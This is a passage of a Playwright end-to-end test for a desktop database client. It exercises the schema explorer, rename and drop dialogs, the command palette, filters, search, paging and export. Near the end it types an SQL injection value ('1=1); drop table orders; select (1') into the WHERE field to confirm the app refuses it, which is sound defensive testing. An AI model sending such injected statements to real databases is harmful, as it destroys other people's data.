    const dialog = page.getByRole("dialog", { name: "Export customer" });
    await dialog.getByRole("combobox", { name: /^Format/ }).selectOption("json");
    await dialog.getByRole("button", { name: "Export…" }).click();
    await dialog.locator(".export-result", { hasText: "Exported" }).waitFor();
    await dialog.getByRole("button", { name: "Close" }).click();
    await page.evaluate(() => delete window.__spelaionSavePath);
    const customers = JSON.parse(readFileSync(path, "utf8"));
    assert.ok(customers.length > 0);
    assert.ok("id" in customers[0]);
  }
  // Refresh: a table created from a query tab appears with F5 on its schema, and "Refresh all
  // schemas" sees it go; open folders stay open.
  const mainSchema = page.getByRole("button", { name: "Expand or collapse schema main" });
  const probeNode = page.getByRole("button", { name: "Expand or collapse refresh_probe", exact: true });
  await replaceQuery(panel, "create table refresh_probe (id integer);\ninsert into refresh_probe values (1);");
  await run(panel);
  await panel.getByText("Statement 2: 1 row", { exact: false }).waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  await mainSchema.focus();
  await page.keyboard.press("F5");
  await probeNode.waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "4");
  // Two rows: the next step waits for "1 row" in this same tab.
  await replaceQuery(panel, "drop table refresh_probe;\nselect 1 as dropped union all select 2;");
  await run(panel);
  await page.getByRole("button", { name: "Run anyway" }).click();
  await panel.locator(".statusline", { hasText: "2 rows" }).waitFor();
  await mainSchema.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Refresh all schemas" }).click();
  await probeNode.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  assert.equal(await tablesFolder.getAttribute("aria-expanded"), "true");
  // Rename (ADR-026): the dialog shows the core's SQL, and it runs only from there.
  await replaceQuery(panel, "create table rename_probe (id integer, a integer);\nselect 1 as created union all select 2 union all select 3;");
  await run(panel);
  await panel.locator(".statusline", { hasText: "3 rows" }).waitFor();
  await mainSchema.focus();
  await page.keyboard.press("F5");
  const renameProbe = page.getByRole("button", { name: "Expand or collapse rename_probe", exact: true });
  await renameProbe.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Rename…" }).click();
  const renameDialog = page.getByRole("dialog", { name: "Rename rename_probe" });
  await renameDialog.locator('input[name="newName"]').fill("renamed_probe");
  const changeSql = renameDialog.getByLabel("SQL that will run");
  await changeSql.filter({ hasText: "ALTER TABLE rename_probe RENAME TO renamed_probe;" }).waitFor();
  await shot("05h-rename-dialog");
  await renameDialog.getByRole("button", { name: "Rename", exact: true }).click();
  await renameDialog.waitFor({ state: "detached" });
  const renamedProbe = page.getByRole("button", { name: "Expand or collapse renamed_probe", exact: true });
  await renamedProbe.waitFor();
  assert.equal(await renameProbe.count(), 0);
  // Metadata tabs apply the existing reviewed object action and refresh both views.
  await renamedProbe.locator(".twisty").click();
  const renamedChildren = renamedProbe.locator("xpath=..");
  await renamedChildren.getByRole("button", { name: "Expand or collapse Columns", exact: true }).locator(".label").dblclick();
  const renamedOverview = page.getByRole("region", { name: "Columns of renamed_probe" });
  await renamedOverview.getByText("a", { exact: true }).waitFor();
  await renamedOverview.getByText("a", { exact: true }).locator("xpath=..").getByRole("button", { name: "Rename…" }).click();
  const renameFromOverview = page.getByRole("dialog", { name: "Rename column a of renamed_probe" });
  await renameFromOverview.locator('input[name="newName"]').fill("a_temp");
  await renameFromOverview.getByLabel("SQL that will run").filter({ hasText: "RENAME COLUMN a TO a_temp" }).waitFor();
  await renameFromOverview.getByRole("button", { name: "Rename", exact: true }).click();
  await renamedOverview.getByText("a_temp", { exact: true }).waitFor();
  await renamedOverview.getByRole("row").filter({ hasText: "a_temp" }).getByRole("button", { name: "Rename…" }).click();
  const restoreColumn = page.getByRole("dialog", { name: "Rename column a_temp of renamed_probe" });
  await restoreColumn.locator('input[name="newName"]').fill("a");
  await restoreColumn.getByLabel("SQL that will run").filter({ hasText: "RENAME COLUMN a_temp TO a" }).waitFor();
  await restoreColumn.getByRole("button", { name: "Rename", exact: true }).click();
  await renamedOverview.getByText("a", { exact: true }).waitFor();
  await page.keyboard.press("Control+w");
  await renamedProbe.locator(".twisty").click();
  // F2 on a column renames it; its table reads its columns again.
  await renamedProbe.locator(".twisty").click();
  const probeColumns = renamedProbe.locator("xpath=..");
  await probeColumns.locator(".leaf-row", { hasText: /^a/ }).focus();
  await page.keyboard.press("F2");
  const columnDialog = page.getByRole("dialog", { name: "Rename column a of renamed_probe" });
  await columnDialog.locator('input[name="newName"]').fill("amount");
  await columnDialog.getByLabel("SQL that will run").filter({ hasText: "ALTER TABLE renamed_probe RENAME COLUMN a TO amount;" }).waitFor();
  await page.keyboard.press("Enter");
  await columnDialog.waitFor({ state: "detached" });
  const amountColumn = probeColumns.locator(".leaf-row", { hasText: "amount" });
  await amountColumn.waitFor();
  // Ctrl+click chooses columns; a new index takes them in that order (opened, not run).
  const idColumn = probeColumns.locator(".leaf-row", { hasText: /^id/ });
  await amountColumn.click({ modifiers: ["Control"] });
  await idColumn.click({ modifiers: ["Control"] });
  assert.equal(await idColumn.getAttribute("aria-selected"), "true");
  await idColumn.click({ button: "right" });
  await page.getByRole("menuitem", { name: "New index on (amount, id)" }).click();
  await panel.locator(".cm-content", { hasText: "CREATE INDEX" }).waitFor();
  assert.equal(
    (await panel.locator(".cm-content").innerText()).trimEnd(),
    "CREATE INDEX renamed_probe_amount_id_idx ON renamed_probe (amount, id);",
  );
  // SQLite adds constraints only when it creates a table.
  await idColumn.click({ button: "right" });
  assert.equal(await page.getByRole("menuitem", { name: /^New unique constraint/ }).count(), 0);
  await page.keyboard.press("Escape");
  await idColumn.click();
  assert.equal(await idColumn.getAttribute("aria-selected"), "false");
  // Drop: the core's SQL first, without "Cascade" on SQLite, which has none.
  await amountColumn.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Drop…" }).click();
  const dropColumn = page.getByRole("dialog", { name: "Drop renamed_probe.amount" });
  await dropColumn.getByLabel("SQL that will run").filter({ hasText: "ALTER TABLE renamed_probe DROP COLUMN amount;" }).waitFor();
  assert.equal(await dropColumn.locator('input[name="cascade"]').count(), 0);
  await dropColumn.getByRole("button", { name: "Drop", exact: true }).click();
  await amountColumn.waitFor({ state: "detached" });
  await renamedProbe.locator(".twisty").click();
  await renamedProbe.focus();
  await page.keyboard.press("Delete");
  const dropTable = page.getByRole("dialog", { name: "Drop renamed_probe" });
  await dropTable.getByLabel("SQL that will run").filter({ hasText: "DROP TABLE renamed_probe;" }).waitFor();
  await shot("05h-drop-dialog");
  await dropTable.getByRole("button", { name: "Drop", exact: true }).click();
  await renamedProbe.waitFor({ state: "detached" });
  // "New table…" on the Tables folder: the create table form (ADR-047). The core writes the
  // script, shown as it follows the form, and Create table runs exactly that.
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "New table…" }).click();
  const newTable = page.getByRole("dialog", { name: "New table in main" });
  await newTable.getByLabel("Table name").fill("smoke_form_table");
  await newTable.getByRole("button", { name: "Add index" }).click();
  await newTable.getByLabel("Columns of index 1", { exact: true }).fill("name");
  await newTable.getByRole("button", { name: "Add foreign key" }).click();
  await newTable.getByLabel("Columns of foreign key 1", { exact: true }).fill("id");
  await newTable.getByLabel("Referenced table of foreign key 1", { exact: true }).fill("customer");
  await newTable.getByLabel("Referenced columns of foreign key 1", { exact: true }).fill("id");
  const newTableSql = newTable.getByLabel("SQL that will run");
  await newTableSql.filter({ hasText: "CREATE INDEX smoke_form_table_name_idx ON smoke_form_table (name);" }).waitFor();
  await newTableSql.filter({ hasText: "CONSTRAINT smoke_form_table_id_fkey FOREIGN KEY (id) REFERENCES customer (id)" }).waitFor();
  await shot("sdb-21-create-table");
  const themeBeforeCreate = await page.evaluate(() => { const theme = document.documentElement.dataset.theme; document.documentElement.dataset.theme = "dark"; return theme; });
  await shot("sdb-21-create-table-dark");
  await page.evaluate((theme) => { if (theme === undefined) delete document.documentElement.dataset.theme; else document.documentElement.dataset.theme = theme; }, themeBeforeCreate);
  await newTable.getByRole("button", { name: "Create table" }).click();
  await newTable.waitFor({ state: "detached" });
  const formTable = page.getByRole("button", { name: "Expand or collapse smoke_form_table", exact: true });
  await formTable.waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "4");
  await formTable.focus();
  await page.keyboard.press("Delete");
  const dropFormTable = page.getByRole("dialog", { name: "Drop smoke_form_table" });
  await dropFormTable.getByRole("button", { name: "Drop", exact: true }).click();
  await formTable.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Open object by name (Ctrl+Shift+D): found in the catalog, opened, and shown in the tree.
  const viewsFolder = page.getByRole("button", { name: "Expand or collapse Views", exact: true });
  await viewsFolder.click();
  assert.equal(await viewsFolder.getAttribute("aria-expanded"), "false");
  await page.keyboard.press("Control+Shift+D");
  const openObject = page.getByRole("dialog", { name: "Open object by name" });
  await openObject.getByRole("searchbox", { name: "Object name" }).fill("ORDERS");
  const results = openObject.getByRole("listbox", { name: "Objects found" });
  await results.getByRole("option").nth(1).waitFor();
  assert.deepEqual(
    await results.getByRole("option").locator(".label").allInnerTexts(),
    ["orders", "big_orders"],
  );
  await shot("05i-open-object");
  await page.keyboard.press("ArrowDown");
  await page.keyboard.press("Enter");
  await openObject.waitFor({ state: "detached" });
  await page.waitForFunction(() =>
    document.querySelector('[aria-label="Expand or collapse Views"]')?.getAttribute("aria-expanded") === "true",
  );
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).waitFor();
  // The command palette (Ctrl+Shift+P): the registry's commands with their shortcuts, and the
  // objects the explorer has loaded with their actions. Nothing here changes the active tab.
  step("command palette: run a command, and an action on an object the explorer loaded");
  await page.keyboard.press("Control+Shift+P");
  const palette = page.getByRole("dialog", { name: "Command palette" });
  const paletteBox = palette.getByRole("combobox");
  const paletteResults = palette.getByRole("listbox", { name: "Commands and objects" });
  const paletteLabels = () => paletteResults.getByRole("option").locator(".palette-label").allInnerTexts();
  // Nothing typed: every command that can run, each with its shortcut.
  assert.equal(await paletteResults.locator('[data-command="tab.new"] .menu-shortcut').innerText(), "Ctrl+T");
  assert.equal(await paletteResults.locator('[data-command="tab.reopen"] .palette-label').innerText(), "Tab: Reopen closed tab");
  // A command: the history panel opens, and the palette is gone.
  await paletteBox.fill("query hist");
  assert.equal((await paletteLabels())[0], "View: Query history");
  await page.keyboard.press("Enter");
  await palette.waitFor({ state: "detached" });
  const historyPanel = page.getByRole("complementary", { name: "Query history", exact: true });
  await historyPanel.waitFor();
  await page.keyboard.press("Control+Shift+P");
  await paletteBox.fill("query hist");
  await page.keyboard.press("Enter");
  await historyPanel.waitFor({ state: "detached" });
  // Objects: from the explorer's catalog, best match first, with their kind, schema and connection.
  await page.keyboard.press("Control+Shift+P");
  await paletteBox.fill("ord");
  await paletteResults.locator(".palette-item", { hasText: "big_orders" }).waitFor();
  assert.deepEqual((await paletteLabels()).slice(0, 2), ["orders", "big_orders"]);
  assert.equal(await paletteResults.getByRole("option").first().locator(".palette-detail").innerText(), "Table · main · Shop (SQLite)");
  await shot("sdb-18-palette");
  await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
  await shot("sdb-18-palette-dark");
  await page.evaluate(() => { document.documentElement.dataset.theme = "light"; });
  // Enter lists the object's actions; Escape goes back to the search as it was.
  await page.keyboard.press("Enter");
  assert.deepEqual(await paletteLabels(), ["Open data", "Open structure", "New console", "ER diagram of related tables", "Copy name", "Copy qualified name", "Show in explorer"]);
  await shot("sdb-18-palette-actions");
  await page.keyboard.press("Escape");
  assert.equal(await paletteBox.inputValue(), "ord");
  await page.keyboard.press("Enter");
  await paletteBox.fill("copy name");
  assert.equal((await paletteLabels())[0], "Copy name");
  const copiedBeforePalette = await page.evaluate(() => window.__copied.length);
  await page.keyboard.press("Enter");
  await palette.waitFor({ state: "detached" });
  assert.equal(await copied(copiedBeforePalette + 1), "orders");
  // Link with editor: the active tab (big_orders' data) is shown in the tree as it changes.
  await viewsFolder.click();
  assert.equal(await viewsFolder.getAttribute("aria-expanded"), "false");
  const linkWithEditor = page.getByRole("button", { name: "Link with editor" });
  // The toggle is a saved preference: it shows at once, and the core has it once saved.
  const linkSaved = (value) =>
    page.waitForFunction(
      async (expected) => (await window.__TAURI_INTERNALS__.invoke("get_explorer_preferences")).linkWithEditor === expected,
      value,
    );
  await linkWithEditor.click();
  await linkWithEditor.and(page.locator('[aria-pressed="true"]')).waitFor();
  await linkSaved(true);
  await page.waitForFunction(() =>
    document.querySelector('[aria-label="Expand or collapse Views"]')?.getAttribute("aria-expanded") === "true",
  );
  // Two quick clicks: the second lands while the first is saving and is saved after it, never
  // dropped (SDB-83), so the toggle ends where it started, shown and saved.
  await linkWithEditor.dblclick();
  // The core held `true` before them too: give their two saves (milliseconds each) time to run.
  await page.waitForTimeout(500);
  await linkSaved(true);
  assert.equal(await linkWithEditor.getAttribute("aria-pressed"), "true");
  await linkWithEditor.click();
  await linkWithEditor.and(page.locator('[aria-pressed="false"]')).waitFor();
  await linkSaved(false);
  // Bookmarks: listed above the connections; a click shows the object in the tree.
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Add bookmark" }).click();
  const ordersBookmark = page.getByRole("button", { name: "Bookmark orders: open it", exact: true });
  await ordersBookmark.waitFor();
  assert.equal(await ordersBookmark.locator(".muted").innerText(), "Shop (SQLite) · main");
  await ordersNode.locator(".bookmark-star").waitFor();
  await tablesFolder.click();
  assert.equal(await tablesFolder.getAttribute("aria-expanded"), "false");
  await ordersBookmark.click();
  await page.waitForFunction(() =>
    document.querySelector('[aria-label="Expand or collapse Tables"]')?.getAttribute("aria-expanded") === "true",
  );
  await shot("05j-bookmarks");
  await ordersBookmark.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Remove bookmark" }).click();
  await ordersBookmark.waitFor({ state: "detached" });
  assert.equal(await ordersNode.locator(".bookmark-star").count(), 0);
  // big_orders' data tab, opened by name above, is closed: later steps look for "orders" tabs.
  await page.keyboard.press("Control+w");
  await page.locator(".tabbar .tab", { hasText: "big_orders" }).waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Quick filter (Ctrl+Shift+F): only what matches by name, plus the expanded connections.
  await page.keyboard.press("Control+Shift+F");
  const quickFilter = page.getByRole("searchbox", { name: "Filter the explorer" });
  await quickFilter.waitFor();
  await page.waitForFunction(() => document.activeElement?.getAttribute("aria-label") === "Filter the explorer");
  await page.keyboard.insertText("ord");
  await page.getByRole("button", { name: "Expand or collapse customer", exact: true }).waitFor({ state: "detached" });
  await ordersNode.waitFor();
  await page.getByRole("button", { name: "Expand or collapse big_orders", exact: true }).waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "1");
  assert.equal(await page.locator('.connection-row:has-text("MariaDB (Docker)")').count(), 0);
  await page.keyboard.press("Escape");
  assert.equal(await quickFilter.inputValue(), "");
  await page.locator('.connection-row:has-text("MariaDB (Docker)")').waitFor();
  await page.keyboard.press("Escape");
  await quickFilter.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Filters as in DBeaver: right-click a folder, Configure filter…; the folder says it is filtered.
  const customerNode = page.getByRole("button", { name: "Expand or collapse customer", exact: true });
  const filterDialog = page.getByRole("dialog", { name: "Filter of tables, views and other objects for Shop (SQLite)" });
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Configure filter…" }).click();
  await filterDialog.locator('input[name="objects.exclude"]').fill("CUST*");
  await filterDialog.getByRole("button", { name: "Apply" }).click();
  await filterDialog.waitFor({ state: "detached" });
  await customerNode.waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "2");
  await tablesFolder.locator(".tag", { hasText: "filtered" }).waitFor();
  await shot("05h-filtered-folder");
  // Filtered on this computer instead of in the catalog query: the same tables.
  const setServerSide = (checked) =>
    withSettings("explorer", async (settings) => {
      await settings.locator('input[name="serverSideFilters"]').setChecked(checked);
      await page.waitForFunction((want) => {
        const input = document.querySelector('input[name="serverSideFilters"]');
        return input?.checked === want && !input.disabled;
      }, checked);
    });
  await setServerSide(false);
  await mainSchema.focus();
  await page.keyboard.press("F5");
  await ordersNode.waitFor();
  assert.equal(await customerNode.count(), 0);
  assert.equal(await tablesFolder.locator(".muted").innerText(), "2");
  await setServerSide(true);
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Configure filter…" }).click();
  assert.equal(await filterDialog.locator('input[name="objects.exclude"]').inputValue(), "CUST*");
  await filterDialog.getByRole("button", { name: "Show everything" }).click();
  await customerNode.waitFor();
  assert.equal(await tablesFolder.locator(".tag").count(), 0);
  // "Hide" and "Show only" on one object write its name into the same filter.
  await customerNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Hide customer" }).click();
  await customerNode.waitFor({ state: "detached" });
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Show only orders" }).click();
  await page.getByRole("button", { name: "Expand or collapse product", exact: true }).waitFor({ state: "detached" });
  assert.equal(await tablesFolder.locator(".muted").innerText(), "1");
  await tablesFolder.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Configure filter…" }).click();
  assert.equal(await filterDialog.locator('input[name="objects.include"]').inputValue(), "orders");
  assert.equal(await filterDialog.locator('input[name="objects.exclude"]').inputValue(), "customer");
  await filterDialog.getByRole("button", { name: "Show everything" }).click();
  await customerNode.waitFor();
  assert.equal(await tablesFolder.locator(".muted").innerText(), "3");
  // Only the connected connections: Shop is open; nothing has connected to the Docker ones yet.
  const connectedOnly = page.getByRole("button", { name: "Show only connected connections" });
  await connectedOnly.click();
  await page.locator('.connection-row:has-text("MariaDB (Docker)")').waitFor({ state: "detached" });
  assert.equal(await page.locator('.connection-row:has-text("Postgres (Docker)")').count(), 0);
  assert.equal(await page.locator('.connection-row:has-text("Shop (SQLite)")').count(), 1);
  assert.equal(await connectedOnly.getAttribute("aria-pressed"), "true");
  await connectedOnly.click();
  await page.locator('.connection-row:has-text("MariaDB (Docker)")').waitFor();
  await ordersNode.click({ button: "right" });
  await page.getByRole("menuitem", { name: "Count rows" }).click();
  const exactCount = ordersNode.locator('[title="Exact row count: 50,000"]');
  await exactCount.waitFor();
  assert.equal(await exactCount.innerText(), "50K");
  assert.equal(await ordersNode.getAttribute("aria-description"), "Exact row count: 50,000");
  await setLanguage("es");
  const ordersNodeEs = page.getByRole("button", { name: "Expandir o contraer orders", exact: true });
  const spanishCount = ordersNodeEs.locator('[title="Número exacto de filas: 50.000"]');
  await spanishCount.waitFor();
  assert.equal(await spanishCount.innerText(), new Intl.NumberFormat("es", { notation: "compact", maximumFractionDigits: 1 }).format(50_000));
  await setLanguage("en");

  step("search: names from the explorer's catalog, and a value found in the chosen tables");
  {
    // Ctrl+H shows the search panel with its box focused.
    await page.keyboard.press("Control+h");
    const search = page.getByRole("complementary", { name: "Search", exact: true });
    await search.waitFor();
    await page.waitForFunction(() => document.activeElement?.getAttribute("aria-label") === "Table, view, routine or column name…");
    // Names: what the explorer read, and each schema's columns read once from the catalog.
    await page.keyboard.insertText("customer");
    const columnHit = search.locator(".search-hit").filter({ has: page.locator(".search-hit-name", { hasText: /^orders\.customer_id$/ }) });
    await columnHit.waitFor();
    const firstHit = search.locator(".search-hit").first();
    assert.equal(await firstHit.locator(".search-hit-name").innerText(), "customer");
    assert.equal(await firstHit.locator(".search-hit-meta").innerText(), "main · Table");
    await search.locator(".search-status", { hasText: /^\d+ matches$/ }).waitFor();
    await shot("sdb-26-names");
    // Columns can be left out.
    await search.getByLabel("Include columns").uncheck();
    await columnHit.waitFor({ state: "detached" });
    await search.getByLabel("Include columns").check();
    await columnHit.waitFor();
    // A column opens its table's data.
    const tabsBefore = await page.locator(".tabbar .tab").count();
    await columnHit.click();
    await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor();
    // Closed once its first page is in: a tab still connecting is not the one to test here.
    await panel.locator(".table-range").filter({ hasText: "rows 1–500" }).waitFor();
    await page.keyboard.press("Control+w");
    await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, tabsBefore);
    // Data: one SELECT per chosen table, the value bound by the core, reads only.
    await search.getByRole("radio", { name: "Data" }).click();
    const valueBox = search.getByRole("searchbox", { name: "Value to find in the tables…" });
    await valueBox.fill("CUSTOMER42@");
    const searchData = search.getByRole("button", { name: "Search data" });
    assert.equal(await searchData.isDisabled(), true);
    await search.getByText("Choose at least one table.", { exact: true }).waitFor();
    await search.getByRole("button", { name: "Select shown" }).click();
    await search.getByText("4 of 4 tables chosen", { exact: true }).waitFor();
    await searchData.click();
    await search.locator(".search-status", { hasText: "1 hit in 4 tables." }).waitFor();
    const dataHit = search.locator(".search-hit", { hasText: "id = 42" });
    assert.equal(await dataHit.locator(".search-hit-column").innerText(), "email");
    assert.equal(await dataHit.locator(".search-hit-match code").innerText(), "customer42@example.com");
    await shot("sdb-26-data");
    await page.evaluate(() => { document.documentElement.dataset.theme = "dark"; });
    await shot("sdb-26-data-dark");
    await page.evaluate(() => { document.documentElement.dataset.theme = "light"; });
    // Match case finds nothing with the value in capitals.
    await search.getByText("Options", { exact: true }).click();
    await search.getByLabel("Match case").check();
    await searchData.click();
    await search.locator(".search-status", { hasText: "0 hits in 4 tables." }).waitFor();
    await search.getByLabel("Match case").uncheck();
    await searchData.click();
    await dataHit.waitFor();
    // A hit opens the table data tab filtered to its row by the core's filter.
    await dataHit.click();
    await page.locator(".tabbar .tab.active", { hasText: "customer" }).waitFor();
    await panel.locator(".table-range").filter({ hasText: "rows 1–1" }).waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), "id = 42");
    await page.keyboard.press("Control+w");
    await page.waitForFunction((n) => document.querySelectorAll(".tabbar .tab").length === n, tabsBefore);
    // Cancel: a search over every table stops when asked, or ends first; either way it says so.
    await valueBox.fill("zzz-not-there");
    await searchData.click();
    const cancelSearch = search.getByRole("button", { name: "Cancel search" });
    if (await cancelSearch.isVisible().catch(() => false)) await cancelSearch.click().catch(() => undefined);
    await search.locator(".search-status", { hasText: /Search cancelled after|0 hits in 4 tables\./ }).waitFor();
    await searchData.waitFor();
    // Back to the explorer.
    await page.locator('[data-command="view.explorer"]').click();
    await search.waitFor({ state: "hidden" });
  }

  step("table data: pages, WHERE and ORDER BY written and checked by the core");
  await ordersNode.locator(".label").dblclick();
  assert.equal(await ordersNode.getAttribute("aria-expanded"), "false");
  await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor();
  const range = panel.locator(".table-range");
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  await panel.getByText("This page only", { exact: true }).waitFor();
  // Export takes every row the WHERE keeps, in the ORDER BY, not only the page on screen.
  await panel.getByRole("textbox", { name: "WHERE" }).fill("id > 49000");
  await panel.getByRole("textbox", { name: "ORDER BY" }).fill("id desc");
  await page.keyboard.press("Enter");
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  {
    const path = join(userDir, "orders-filtered.csv");
    await page.evaluate((target) => (window.__spelaionSavePath = target), path);
    await panel.locator(".export-button").getByRole("button", { name: "Export…" }).click();
    const dialog = page.getByRole("dialog", { name: "Export result" });
    assert.ok(await dialog.getByRole("radio", { name: /^Every row the filter keeps/ }).isChecked());
    await dialog.getByRole("button", { name: "Export…" }).click();
    await dialog.locator(".export-result", { hasText: "Exported 1,000 rows" }).waitFor();
    await dialog.getByRole("button", { name: "Close" }).click();
    await page.evaluate(() => delete window.__spelaionSavePath);
    const lines = readFileSync(path, "utf8").trimEnd().split("\r\n");
    assert.equal(lines.length, 1_001);
    assert.ok(lines[1].startsWith("50000,"), lines[1]);
    assert.ok(lines[1_000].startsWith("49001,"), lines[1_000]);
  }
  await panel.getByRole("textbox", { name: "ORDER BY" }).fill("");
  await panel.getByRole("textbox", { name: "WHERE" }).fill("total > 1990");
  await page.keyboard.press("Enter");
  await range.filter({ hasText: "rows 1–264" }).waitFor();
  await panel.getByRole("button", { name: "Count", exact: true }).click();
  await range.filter({ hasText: "rows 1–264 of 264" }).waitFor();
  assert.ok(await panel.getByRole("button", { name: "Next page" }).isDisabled());
  await shot("05i-table-data");
  await panel.getByRole("textbox", { name: "WHERE" }).fill("");
  await panel.getByRole("button", { name: "Apply", exact: true }).click();
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  // Hold count responses after the real command completes, so page and filter changes race
  // with an outstanding count deterministically, without slowing the database.
  await page.evaluate(() => {
    const original = window.fetch;
    const pending = [];
    window.__sdb141 = { original, pending };
    window.fetch = (url, ...args) => {
      const result = original(url, ...args);
      if (!String(url).endsWith("/count_table_rows")) return result;
      return new Promise((resolve, reject) => pending.push(() => result.then(resolve, reject)));
    };
  });
  await panel.getByRole("button", { name: "Count", exact: true }).click();
  await page.waitForFunction(() => window.__sdb141.pending.length === 1);
  const firstPageResult = await panel.getByRole("button", { name: "Result 1", exact: true }).elementHandle();
  await panel.getByRole("button", { name: "Next page" }).click();
  await range.filter({ hasText: "rows 501–1,000" }).waitFor();
  await page.waitForFunction((button) => !button.isConnected, firstPageResult);
  await panel.locator(".statusline", { hasText: "500 rows" }).waitFor();
  await page.evaluate(() => window.__sdb141.pending.shift()());
  await range.filter({ hasText: "rows 501–1,000 of 50,000" }).waitFor();
  await panel.getByRole("button", { name: "Count", exact: true }).click();
  await page.waitForFunction(() => window.__sdb141.pending.length === 1);
  await panel.getByRole("textbox", { name: "WHERE" }).fill("id > 49998");
  await panel.getByRole("button", { name: "Apply", exact: true }).click();
  await range.filter({ hasText: "rows 1–2" }).waitFor();
  await page.evaluate(() => window.__sdb141.pending.shift()());
  await page.waitForTimeout(200);
  assert.equal(await range.innerText(), "rows 1–2", "a count for the old filter is discarded");
  assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), "id > 49998");
  await page.evaluate(() => {
    window.fetch = window.__sdb141.original;
    delete window.__sdb141;
  });
  await panel.getByRole("textbox", { name: "WHERE" }).fill("");
  await panel.getByRole("button", { name: "Apply", exact: true }).click();
  await range.filter({ hasText: "rows 1–500" }).waitFor();
  // A header click sorts in the server: ORDER BY written with the engine's quoting.
  {
    // The new page mounts a new grid: wait until it is laid out.
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    await page.mouse.click(box.x + 52 + 20, box.y + 18);
    await page.mouse.click(box.x + 52 + 20, box.y + 18);
    await panel.locator('.grid-scroller[aria-label$="sorted by id, descending"]').waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "ORDER BY" }).inputValue(), "id DESC");
    await range.filter({ hasText: "rows 1–500" }).waitFor();
    // The sort shows at once; the page it asked for may still be on its way.
    let firstId = "";
    for (let i = 0; i < 20 && firstId !== "50000"; i++) {
      if (i > 0) await page.waitForTimeout(250);
      const grid = await panel.locator(".grid-scroller").boundingBox();
      if (!grid) continue;
      const before = await page.evaluate(() => window.__copied.length);
      await page.mouse.click(grid.x + 52 + 20, grid.y + 34 + 12);
      await page.keyboard.press("Control+c");
      // While that page is on its way there may be no cell to copy yet: try again, not wait.
      const copiedNow = await page
        .waitForFunction((n) => window.__copied.length > n, before, { timeout: 3000 })
        .then(() => true, () => false);
      if (copiedNow) firstId = (await page.evaluate(() => window.__copied[window.__copied.length - 1])).trimEnd();
    }
    assert.equal(firstId, "50000");
  }
  // "Filter by this value" goes to the table's WHERE, written by the core.
  {
    const grid = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(grid.x + 52 + 20, grid.y + 34 + 12, { button: "right" });
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Filter ▸" }).hover();
    await panel.getByText("Added to the table's WHERE").waitFor();
    await panel.getByRole("menuitem", { name: "id = 50000", exact: true }).click();
    await range.filter({ hasText: "rows 1–1" }).waitFor();
    assert.equal(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), "id = 50000");
    let box = null;
    for (let i = 0; i < 40 && !box; i++) {
      box = await panel.locator(".grid-scroller").boundingBox();
      if (!box) await page.waitForTimeout(100);
    }
    const widths = (await panel.locator(".grid-scroller").getAttribute("data-column-widths")).split(",").map(Number);
    const createdX = box.x + 52 + widths[0] + widths[1] + 20;
    await page.mouse.click(createdX, box.y + 34 + 12, { button: "right" });
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Filter ▸" }).hover();
    await panel.getByRole("menuitem", { name: /^created contains '/ }).click();
    await page.waitForFunction(() => document.querySelector('input[aria-label="WHERE"]')?.value.includes(" AND "));
    assert.match(await panel.getByRole("textbox", { name: "WHERE" }).inputValue(), /^id = 50000 AND created LIKE '%\d{4}-\d{2}-\d{2}%' ESCAPE '!'$/);
    await range.filter({ hasText: "rows 1–1" }).waitFor();
    await shot("05i2-table-filter-by-value");
    // Names qualified with the table, written like the explorer's.
    box = await panel.locator(".grid-scroller").boundingBox();
    await page.mouse.click(box.x + 52 + 20, box.y + 18, { button: "right" });
    const before = await page.evaluate(() => window.__copied.length);
    await panel.locator(".result-grid-menu").getByRole("menuitem", { name: "Copy column names ▸" }).hover();
    await panel.getByRole("menuitem", { name: "Qualified with the table" }).click();
    assert.equal(await copied(before + 1), "orders.id");
  }
  // What is typed cannot turn the page into another statement.
  await panel.getByRole("textbox", { name: "WHERE" }).fill("1=1); drop table orders; select (1");
  await page.keyboard.press("Enter");
  await panel.locator(".error-box", { hasText: "must not change the query" }).waitFor();
  await page.keyboard.press("Control+w");
  await page.locator(".tabbar .tab.active", { hasText: "orders" }).waitFor({ state: "detached" });

  step("foreign keys: open the referenced row, and the rows that point back to it");
  {
    const gridBox = async () => {
      let box = null;
      for (let i = 0; i < 40 && !box; i++) {
